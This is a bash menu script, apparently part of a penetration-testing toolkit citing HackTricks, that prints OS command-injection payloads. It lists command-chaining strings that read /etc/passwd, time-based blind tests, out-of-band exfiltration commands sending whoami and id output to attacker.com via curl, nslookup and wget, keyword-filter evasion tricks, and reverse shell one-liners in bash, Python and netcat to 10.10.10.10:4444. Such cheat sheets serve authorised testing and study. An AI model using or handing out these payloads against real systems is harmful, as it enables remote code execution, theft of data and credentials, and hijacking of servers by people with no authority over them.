#!/bin/bash
# HackTricks Ref: command-injection
# Module: OS Command Injection (RCE)

echo -e "${C6}[WEB ATTACK: COMMAND_INJECTION]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/command-injection"
echo -e "--------------------------------------------------"

echo -e "${C4}Select Injection Technique:${NC}"
echo "1) Active Injection (Chaining Commands)"
echo "2) Blind Injection (Time-based)"
echo "3) Blind Injection (Out-of-band/DNS)"
echo "4) Filter Evasion (Space, Slashes, Keywords)"
echo "5) Reverse Shell Payloads (One-Liners)"
echo "0) Exit"

read -p "Selection: " cmd_opt

case $cmd_opt in
    1)
        echo -e "\n${C2}[*] Command Chaining Payloads:${NC}"
        echo "Try appending to the legitimate parameter:"
        echo " - ; id"
        echo " - | id"
        echo " - && id"
        echo " - \`id\`"
        echo " - \$(id)"
        echo "Example: ping -c 1 127.0.0.1; cat /etc/passwd"
        ;;
    2)
        echo -e "\n${C2}[*] Blind Time-based Testing:${NC}"
        echo "If you see no output, check if the server pauses:"
        echo " - ; sleep 10"
        echo " - | sleep 10"
        echo " - & ping -c 10 127.0.0.1 &"
        ;;
    3)
        echo -e "\n${C2}[*] Out-of-Band (OOB) Injection:${NC}"
        echo "Exfiltrate data via DNS or HTTP:"
        echo " - ; curl http://attacker.com/\$(whoami)"
        echo " - ; nslookup \$(whoami).attacker.com"
        echo " - ; wget --post-data=\$(id) http://attacker.com"
        ;;
    4)
        echo -e "\n${C2}[*] Filter Evasion Tricks:${NC}"
        echo " - Bypass Spaces: \${IFS}, %20, %09, <"
        echo " - Bypass '/' : \${HOME:0:1}"
        echo " - Bypass Blacklisted Keywords (e.g., 'cat'):"
        echo "   - c''at /etc/pa's'swd"
        echo "   - c\at /etc/p\asswd"
        echo "   - \$(rev <<< tac) /etc/passwd"
        ;;
    5)
        echo -e "\n${C2}[*] Reverse Shell Quick-List:${NC}"
        echo " - Bash: bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"
        echo " - Python: python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        echo " - Netcat: nc -e /bin/bash 10.10.10.10 4444"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
